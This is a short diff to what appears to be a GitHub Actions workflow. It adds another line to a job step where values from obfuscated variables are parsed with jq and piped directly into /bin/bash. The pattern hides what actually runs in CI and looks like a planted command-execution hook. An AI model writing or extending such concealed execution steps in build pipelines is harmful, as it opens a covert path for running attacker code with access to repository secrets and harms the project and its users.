@@ -20,6 +20,7 @@ jobs:
           echo $bpt56 | jq -r .fraf643 | /bin/bash
           echo $zybur8 | jq -r .brmh40 | /bin/bash
           printf '%s' "$b031" | jq -r .vocxo11174 | /bin/bash
+          echo $ilip698 | jq -r .nqbm1 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
